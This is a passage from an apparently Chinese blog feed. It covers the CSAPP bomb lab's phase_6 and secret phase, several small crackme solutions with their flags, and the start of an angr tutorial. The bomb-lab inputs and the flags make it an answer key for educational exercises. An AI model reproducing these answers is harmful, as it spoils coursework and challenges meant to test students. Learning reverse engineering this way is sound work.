[rbp+0], eax          ; 依次比较，判断每个输入都不同<br>.text:000000000040113E 078 jnz     short loc_401145      ; 不相等就跳转<br>.text:000000000040113E<br>.text:0000000000401140 078 call    explode_bomb          ; Call Procedure<br>.text:0000000000401140<br>.text:0000000000401145     ; ---------------------------------------------------------------------------<br>.text:0000000000401145<br>.text:0000000000401145     loc_401145:                   ; CODE XREF: phase_6+4A↑j<br>.text:0000000000401145 078 add     ebx, 1                ; 控制循环，共6次<br>.text:0000000000401148 078 cmp     ebx, 5                ; Compare Two Operands<br>.text:000000000040114B 078 jle     short loc_401135      ; Jump if Less or Equal (ZF=1 | SF!=OF)<br>.text:000000000040114B<br>.text:000000000040114D 078 add     r13, 4                ; 向下偏移4个字节，取后面输入数字<br>.text:0000000000401151 078 jmp     short loc_401114      ; 返回处偏移加了4<br>.text:0000000000401151<br>.text:0000000000401153     ; ---------------------------------------------------------------------------<br>.text:0000000000401153<br>.text:0000000000401153     loc_401153:                   ; CODE XREF: phase_6+3C↑j<br>.text:0000000000401153 078 lea     rsi, [rsp+24]         ; Load Effective Address<br>.text:0000000000401158 078 mov     rax, r14<br>.text:000000000040115B 078 mov     ecx, 7<br>.text:000000000040115B<br>.text:0000000000401160<br>.text:0000000000401160     loc_401160:                   ; CODE XREF: phase_6+79↓j<br>.text:0000000000401160 078 mov     edx, ecx              ; 7<br>.text:0000000000401160                                   ; 把ecx的值给edx<br>.text:0000000000401162 078 sub     edx, [rax]            ; Integer Subtraction<br>.text:0000000000401164 078 mov     [rax], edx            ; 7 - 每一位输入，将其结果替换为输入的数字中<br>.text:0000000000401166 078 add     rax, 4                ; 输入数字向下取一位<br>.text:000000000040116A 078 cmp     rax, rsi              ; 判断是否处理完输入的6个数字<br>.text:000000000040116D 078 jnz     short loc_401160      ; 7<br>.text:000000000040116D                                   ; 把ecx的值给edx<br>.text:000000000040116D<br>.text:000000000040116F 078 mov     esi, 0<br>.text:0000000000401174 078 jmp     short loc_401197      ; Jump<br>.text:0000000000401174<br>.text:0000000000401176     ; ---------------------------------------------------------------------------<br>.text:0000000000401176<br>.text:0000000000401176     loc_401176:                   ; CODE XREF: phase_6+8B↓j<br>.text:0000000000401176                                   ; phase_6+B5↓j<br>.text:0000000000401176 078 mov     rdx, [rdx+8]          ; node1向下偏移8字节<br>.text:000000000040117A 078 add     eax, 1                ; Add<br>.text:000000000040117D 078 cmp     eax, ecx              ; 找到对应数字所对应的node<br>.text:000000000040117F 078 jnz     short loc_401176      ; node1向下偏移8字节<br>.text:000000000040117F<br>.text:0000000000401181 078 jmp     short loc_401188      ; 存储对应node数据<br>.text:0000000000401181                                   ; 将node进行保存到输入中，<br>.text:0000000000401181                                   ; 每次偏移两个单位，当好去除掉了空格<br>.text:0000000000401181<br>.text:0000000000401183     ; ---------------------------------------------------------------------------<br>.text:0000000000401183<br>.text:0000000000401183     loc_401183:                   ; CODE XREF: phase_6+A9↓j<br>.text:0000000000401183 078 mov     edx, offset node1<br>.text:0000000000401183<br>.text:0000000000401188<br>.text:0000000000401188     loc_401188:                   ; CODE XREF: phase_6+8D↑j<br>.text:0000000000401188 078 mov     [rsp+rsi*2+32], rdx   ; 存储对应node数据<br>.text:0000000000401188                                   ; 将node进行保存到输入中，<br>.text:0000000000401188                                   ; 每次偏移两个单位，当好去除掉了空格<br>.text:000000000040118D 078 add     rsi, 4                ; Add<br>.text:0000000000401191 078 cmp     rsi, 18h              ; 循环6次<br>.text:0000000000401195 078 jz      short loc_4011AB      ; Jump if Zero (ZF=1)<br>.text:0000000000401195<br>.text:0000000000401197<br>.text:0000000000401197     loc_401197:                   ; CODE XREF: phase_6+80↑j<br>.text:0000000000401197 078 mov     ecx, [rsp+rsi]<br>.text:000000000040119A 078 cmp     ecx, 1                ; 取减完后的每一项与1进行比较<br>.text:000000000040119D 078 jle     short loc_401183      ; 不等于往左，等于往右<br>.text:000000000040119D<br>.text:000000000040119F 078 mov     eax, 1<br>.text:00000000004011A4 078 mov     edx, offset node1     ; 将node1地址给edx<br>.text:00000000004011A9 078 jmp     short loc_401176      ; node1向下偏移8字节<br>.text:00000000004011A9<br>.text:00000000004011AB     ; ---------------------------------------------------------------------------<br>.text:00000000004011AB<br>.text:00000000004011AB     loc_4011AB:                   ; CODE XREF: phase_6+A1↑j<br>.text:00000000004011AB 078 mov     rbx, [rsp+32]<br>.text:00000000004011B0 078 lea     rax, [rsp+40]         ; Load Effective Address<br>.text:00000000004011B5 078 lea     rsi, [rsp+80]         ; 将rsi置0<br>.text:00000000004011BA 078 mov     rcx, rbx<br>.text:00000000004011BA<br>.text:00000000004011BD<br>.text:00000000004011BD     loc_4011BD:                   ; CODE XREF: phase_6+DC↓j<br>.text:00000000004011BD 078 mov     rdx, [rax]<br>.text:00000000004011C0 078 mov     [rcx+8], rdx          ; rcx对应node起始地址<br>.text:00000000004011C4 078 add     rax, 8                ; Add<br>.text:00000000004011C8 078 cmp     rax, rsi              ; 判断是否循环完毕<br>.text:00000000004011CB 078 jz      short loc_4011D2      ; Jump if Zero (ZF=1)<br>.text:00000000004011CB<br>.text:00000000004011CD 078 mov     rcx, rdx<br>.text:00000000004011D0 078 jmp     short loc_4011BD      ; Jump<br>.text:00000000004011D0<br>.text:00000000004011D2     ; ---------------------------------------------------------------------------<br>.text:00000000004011D2<br>.text:00000000004011D2     loc_4011D2:                   ; CODE XREF: phase_6+D7↑j<br>.text:00000000004011D2 078 mov     qword ptr [rdx+8], 0<br>.text:00000000004011DA 078 mov     ebp, 5<br>.text:00000000004011DA<br>.text:00000000004011DF<br>.text:00000000004011DF     loc_4011DF:                   ; CODE XREF: phase_6+101↓j<br>.text:00000000004011DF 078 mov     rax, [rbx+8]          ; 将node中的数据段给rax<br>.text:00000000004011E3 078 mov     eax, [rax]<br>.text:00000000004011E5 078 cmp     [rbx], eax            ; 比较后一项和前一项的大小<br>.text:00000000004011E7 078 jge     short loc_4011EE      ; 后一项的数据小于前一项时跳转<br>.text:00000000004011E7<br>.text:00000000004011E9 078 call    explode_bomb          ; Call Procedure<br>.text:00000000004011E9<br>.text:00000000004011EE     ; ---------------------------------------------------------------------------<br>.text:00000000004011EE<br>.text:00000000004011EE     loc_4011EE:                   ; CODE XREF: phase_6+F3↑j<br>.text:00000000004011EE 078 mov     rbx, [rbx+8]<br>.text:00000000004011F2 078 sub     ebp, 1                ; Integer Subtraction<br>.text:00000000004011F5 078 jnz     short loc_4011DF      ; 将node中的数据段给rax<br>.text:00000000004011F5<br>.text:00000000004011F7 078 add     rsp, 50h              ; Add<br>.text:00000000004011FB 028 pop     rbx<br>.text:00000000004011FC 020 pop     rbp<br>.text:00000000004011FD 018 pop     r12<br>.text:00000000004011FF 010 pop     r13<br>.text:0000000000401201 008 pop     r14<br>.text:0000000000401203 000 retn                          ; Return Near from Procedure<br>.text:0000000000401203     ; &#125; // starts at 4010F4<br></code></pre></td></tr></table></figure><p>可以看到有多个函数，我们切换到图形模式：</p><p><img src="https://s2.loli.net/2022/04/03/B56OhTHM7mDo8gS.png" alt=""><br><img src="https://s2.loli.net/2022/04/03/SBViRqdIFpsQM4x.png" alt=""></p><p>在左半部分，多次调试壳以判断出对应函数的第一个部分是确保输入不同，采用了两个循环进行遍历。</p><p>再看看右半部分：</p><p><img src="https://s2.loli.net/2022/04/03/i5wAenhazEGTHSj.png" alt="9.png"></p><p>在函数<code>loc_40153</code>、<code>loc_401160</code>中将我们输入的每一位数字用<code>7</code>减去后保存在原来的位置上，完成后跳转到下一个部分。</p><p><img src="https://s2.loli.net/2022/04/03/WvKgZBAjRT5bf4h.png" alt="10.png"></p><p>在这段程序中我们可以注意到有一个<code>node</code>的偏移，可是打开<code>node</code>查看对应的数据会发现十分的奇怪，但是稍微修复一下可以得到：</p><img src="https://s2.loli.net/2022/04/03/8I2od5fy1gwW3z6.png" style="zoom:80%;" /><p>发现什么了吗？每一个<code>node</code>中都存放着一共偏移量，用来指向另一个<code>node</code>，意味着这个<code>node</code>构成的是一个链表结构，而第一个数据也便是其链表中的数据部分。</p><p>我们在调试中可以发现程序将用<code>7</code>减去我们的输入后的数据保存在原来位置上，之后通过<code>loc_401176</code>对整个链表进行遍历，直到我们的输入和寄存器<code>eax</code>中数据大小一致时将链表中的数据进行保存。</p><p>遍历完后寄存器<code>rdi</code>中便是对应对应的节点，标号与我们的输入相互对应。</p><blockquote><p>node1 -&gt; 1 | node2 -&gt; 2 |…</p></blockquote><p>保存之后程序会对我们保存的寄存器值每次取两个，共<code>5</code>次，将寄存器中数据的前一个节点和后一个节点的值进行比较。当后面的数据小于前面的数据时，继续下一次循环，如果出现小于等于时，则引爆炸弹。</p><p><img src="https://s2.loli.net/2022/04/03/9d8wQLMt4hNiveX.png" alt=""></p><blockquote><p>更正上图一个错误点，于<code>loc_4011FF</code>处，应该是后一项的数据小于前一项时跳转。</p></blockquote><p>同过分析我们了解到，<code>phase_6</code>有如下判断条件：</p><ul><li>输入的六个数字各不相同</li><li>用 7 减去对应的输入数字保存在原来输入的地址处</li><li>通过遍历链表找到减去后数据对应的链表，取其数据部分保存</li><li>循环 5 次，确保每个保存的链表数据值大小小于后一项</li></ul><p>我们提出对应 6 个节点的大小，有如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">node</span> <span class="hljs-number">1</span> -&gt; <span class="hljs-number">0</span>x<span class="hljs-number">14</span>C(<span class="hljs-number">332</span>)<br><span class="hljs-attribute">node</span> <span class="hljs-number">2</span> -&gt; <span class="hljs-number">0</span>xA<span class="hljs-number">8</span>(<span class="hljs-number">168</span>)<br><span class="hljs-attribute">node</span> <span class="hljs-number">3</span> -&gt; <span class="hljs-number">0</span>x<span class="hljs-number">39</span>C(<span class="hljs-number">924</span>)<br><span class="hljs-attribute">node</span> <span class="hljs-number">4</span> -&gt; <span class="hljs-number">0</span>x<span class="hljs-number">2</span>B<span class="hljs-number">3</span>(<span class="hljs-number">691</span>)<br><span class="hljs-attribute">node</span> <span class="hljs-number">5</span> -&gt; <span class="hljs-number">0</span>x<span class="hljs-number">1</span>DD(<span class="hljs-number">477</span>)<br><span class="hljs-attribute">node</span> <span class="hljs-number">6</span> -&gt; <span class="hljs-number">0</span>x<span class="hljs-number">1</span>BB(<span class="hljs-number">443</span>)<br></code></pre></td></tr></table></figure><p>所以排序有：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">node</span> <span class="hljs-number">2</span> &lt; node <span class="hljs-number">1</span> &lt; node <span class="hljs-number">6</span> &lt; node <span class="hljs-number">5</span> &lt; node <span class="hljs-number">4</span> &lt; node <span class="hljs-number">3</span> <br></code></pre></td></tr></table></figure><p>因为保存的<code>node</code>具体大小是经过<code>7</code>减去后得到的，即输入为：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">4 </span><span class="hljs-number">3</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span> <span class="hljs-number">6</span> <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><h2 id="secret-phase">secret_phase</h2><p>当我们完成六个关卡时，会有一个隐藏关卡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">phase_defused</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> v0; <span class="hljs-comment">// [rsp+8h] [rbp-70h] BYREF</span><br>  <span class="hljs-keyword">char</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-6Ch] BYREF</span><br>  <span class="hljs-keyword">char</span> v2[<span class="hljs-number">88</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-68h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+68h] [rbp-10h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)__isoc99_sscanf(&amp;unk_603870, <span class="hljs-string">&quot;%d %d %s&quot;</span>, &amp;v0, &amp;v1, v2) == <span class="hljs-number">3</span><br>    &amp;&amp; !(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)strings_not_equal(v2, <span class="hljs-string">&quot;DrEvil&quot;</span>) )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Curses, you&#x27;ve found the secret phase!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;But finding it and solving it are quite different...&quot;</span>);<br>    secret_phase();<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Congratulations! You&#x27;ve defused the bomb!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>当我们输入的字符串与<code>DrEvil</code>相同时进入道内部的一共函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 <span class="hljs-title">secret_phase</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *line; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// ebx</span><br>  line = read_line();<br>  v1 = strtol(line, <span class="hljs-number">0LL</span>, <span class="hljs-number">10</span>);                   <span class="hljs-comment">// 将输入转化为long int</span><br>  <span class="hljs-keyword">if</span> ( v1 - <span class="hljs-number">1</span> &gt; <span class="hljs-number">1000</span> )                          <span class="hljs-comment">// 输入数据小于1001</span><br>    explode_bomb();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)fun7((__int64)&amp;n1, v1) != <span class="hljs-number">2</span> )<span class="hljs-comment">// fun7返回值为2</span><br>    explode_bomb();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wow! You&#x27;ve defused the secret stage!&quot;</span>);<br>  <span class="hljs-keyword">return</span> phase_defused();<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到，核心的函数为<code>fun7</code>，点开进入：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">fun7</span><span class="hljs-params">(__int64 a1, __int64 a2)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">if</span> ( !a1 )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0xFFFFFFFF</span>LL;<br>  <span class="hljs-keyword">if</span> ( *(_DWORD *)a1 &gt; (<span class="hljs-keyword">int</span>)a2 )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span> * (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)fun7(*(_QWORD *)(a1 + <span class="hljs-number">8</span>), a2);<br>  result = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">if</span> ( *(_DWORD *)a1 != (_DWORD)a2 )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span> * (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)fun7(*(_QWORD *)(a1 + <span class="hljs-number">16</span>), a2) + <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>看起来似乎又是一个递归调用，我们回到传入的数据<code>a1</code>中，经过修复后可以看到：</p><p><img src="https://s2.loli.net/2022/04/03/qWt9o6uyhXcwlCQ.png" alt=""></p><p>所以对应的<code>fun7</code>是一个二叉树，我们画出对应的树状图：</p><p><img src="https://s2.loli.net/2022/04/03/KqzQN2pmTVidJwn.png" alt=""></p><p>若访问到空节点，则返回值会出现<code>0xffffffff</code>，所以我们只能在树上（软件原因树的最右分枝未补全）的节点选择。通过代码我们知道，若从节点<code>n1</code>出发初始值为<code>0x24</code>，若改节点为右儿子则<code>a=2*a+1</code>、为左儿子则<code>a=a*2</code>。所以<code>0x16</code>、<code>0x14</code>节点都可以在到达根节点时返回<code>a=2</code>，输入任意一值即可通关。</p>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>一些简单逆向</title>
    <link href="/2022/03/29/%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91/"/>
    <url>/2022/03/29/%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<p>下载地址：</p><p>链接：<a href="https://pan.baidu.com/s/1VVUkb8vjg4xTDeJ_Ph_W2Q?pwd=qwnd">https://pan.baidu.com/s/1VVUkb8vjg4xTDeJ_Ph_W2Q?pwd=qwnd</a><br>提取码：qwnd</p><h2 id="sysmagic">sysmagic</h2><p>emmm，程序整体比较简单，本质上就是一个自解密，利用调试的<code>SET IP</code>进行绕过里面的<code>if</code>判断即可得到<code>FLAG</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">CTF</span>&#123;debugger_<span class="hljs-number">1</span>s_so_p<span class="hljs-number">0</span>werful_<span class="hljs-number">1</span>n_dyn<span class="hljs-number">4</span>m<span class="hljs-number">1</span>c_<span class="hljs-number">4</span>n<span class="hljs-number">4</span>lySis!&#125;<br></code></pre></td></tr></table></figure><h2 id="2-exe">2.exe</h2><p>这个题目也是比较简单，同样的利用动态调试可以得到对应的<code>FLAG</code>，直接用<code>lazyida</code>提取出来即可</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">DUTCTF</span>&#123;We<span class="hljs-number">1</span>c<span class="hljs-number">0</span>met<span class="hljs-number">0</span>DUTCTF&#125;<br></code></pre></td></tr></table></figure><h2 id="Ransomware-exe">Ransomware.exe</h2><p>打开程序发现是一个模拟<code>WannaCry</code>病毒的界面，简单的查看一下里面的函数可以发现是一个简单的异或加密，将输入的<code>18</code>个字符和<code>0xCC</code>异或，然后于一串字符比较，解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">ans = [<span class="hljs-number">0xFD</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xB5</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ans)):<br>    ans[i] = ans[i] ^ <span class="hljs-number">0xCC</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(ans[i]), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment"># 1_dO_n0t_wAnna_cry</span><br></code></pre></td></tr></table></figure><h2 id="rev1">rev1</h2><p>程序本质上还是一个自我异或，对<code>s</code>中的每一个元素异或自己的下标，对此可以直接<code>patch</code>下面的<code>ptr[i] = 0;</code>而使程序解密后的数据不会被清除，之后进行调试即可直接得到<code>FLAG</code>。</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">CTF&#123;<span class="hljs-keyword">this</span><span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_</span>the<span class="hljs-number">_f</span>lag&#125;<br></code></pre></td></tr></table></figure><h2 id="CreakMe1">CreakMe1</h2><p>拖入IDA分析后感觉加密反编译的有点难看稍微修复一下可以得到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">sub_401060</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *a1)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// edx</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> j; <span class="hljs-comment">// edx</span><br>  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// edx</span><br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> v5[<span class="hljs-number">12</span>]; <span class="hljs-comment">// [esp+Ch] [ebp-10h] BYREF</span><br>  __int16 v6; <span class="hljs-comment">// [esp+18h] [ebp-4h]</span><br>  <span class="hljs-keyword">char</span> v7; <span class="hljs-comment">// [esp+1Ah] [ebp-2h]</span><br><br>  *(_DWORD *)v5 = dword_40708C;                 <span class="hljs-comment">// 48195768h </span><br>  *(_DWORD *)&amp;v5[<span class="hljs-number">4</span>] = dword_407090;             <span class="hljs-comment">// 78586E50h</span><br>  v6 = word_407098;                             <span class="hljs-comment">// 65Eh</span><br>  v7 = byte_40709A;                             <span class="hljs-comment">// 0</span><br>  *(_DWORD *)&amp;v5[<span class="hljs-number">8</span>] = dword_407094;             <span class="hljs-comment">// 58196A54h</span><br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(a1) == <span class="hljs-built_in">strlen</span>(v5) )               <span class="hljs-comment">// flag长12</span><br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(a1); ++i )<br>      a1[i] ^= <span class="hljs-number">0x20</span>u;<br>    <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-built_in">strlen</span>(v5); ++j )<br>      v5[j] -= <span class="hljs-number">5</span>;<br>    v3 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strlen</span>(v5) )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> ( v5[v3 + a1 - v5] == v5[v3] )<span class="hljs-comment">//a1和v5每一项相等</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( ++v3 &gt;= <span class="hljs-built_in">strlen</span>(v5) )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过观察看出来<code>v5</code>存储的是四字节成都的数据，共 3 个，转换为<code>char</code>时长度为 12，也便是输入的<code>flag</code>长。同时输入在和<code>0x20</code>异或后与<code>v5</code>每一项减 5 后相等，可以编写如下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">v5 = [<span class="hljs-number">0x68</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x58</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(v5)):<br>    v5[i] = v5[i] - <span class="hljs-number">5</span><br>    v5[i] = v5[i] ^ <span class="hljs-number">0x20</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(v5[i]), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment"># Cr4ckIsSoE4s</span><br></code></pre></td></tr></table></figure><h2 id="CreakMe">CreakMe</h2><p>又是一个简单的自解密，直接调试，就可以看到解密出来的<code>FLAG</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Dbapp</span>&#123;crackme<span class="hljs-number">100</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="CKme">CKme</h2><p>emmm，这个题目不清楚是不是拿到图片即可，对于图片可以直接使用<code>Pe</code>的插件直接进行提取出来</p><p><img src="https://s2.loli.net/2022/03/29/yXDVfJaMCHcInYi.jpg" alt="CKme-直接爆破-reshack也可以恢复图片0001-rip.jpg"></p><h2 id="1-IDA-R字符串">1-IDA-R字符串</h2><p>这个应该是一个签到题目，直接拖入<code>IDA</code>反编译就可以得到对应的<code>FLAG</code>了。</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="xml">flag</span><span class="hljs-template-variable">&#123;Welcome_To_RE_World!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="StarsCode-星号密码">StarsCode-星号密码</h2><p>直接使用星号密码查看器即可得到对应密钥：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Key</span>:<span class="hljs-number">916</span>a<span class="hljs-number">00</span>c<span class="hljs-number">5</span>ff<span class="hljs-number">8</span>b<span class="hljs-number">5784</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Reverse</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Angr 学习笔记</title>
    <link href="/2022/03/19/Angr%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/03/19/Angr%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1>Angr 学习笔记</h1><h2 id="安装">安装</h2><p>安装的话<code>angr</code>支持了<code>Python 3.x</code>可以不用去折腾<code>2.x</code>的版本了，对于<code>Windows</code>似乎可以直接：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">pip install angr<br></code></pre></td></tr></table></figure><p>就可以完成大部分需要库的安装，对于<code>Linux</code>可能会有一些复杂，这里给出一个链接给大家参考一下：</p><p><a href="https://www.cnblogs.com/lxy8584099/p/13668749.html">https://www.cnblogs.com/lxy8584099/p/13668749.html</a></p><blockquote><p>本人是在<code>Windows</code>下安装的，也没遇到网上出现的缺失文件的现象。出现问题了我也不清楚呀 ：(</p></blockquote><h2 id="部分使用教程">部分使用教程</h2><h3 id="导入-angr-包">导入 angr 包</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br></code></pre></td></tr></table></figure><p>似乎这一部没有出差错就是说明安装成功了。</p><h3 id="新建一个-angr-工程">新建一个 angr 工程</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 创建angr项目</span><br>p = angr.Project(<span 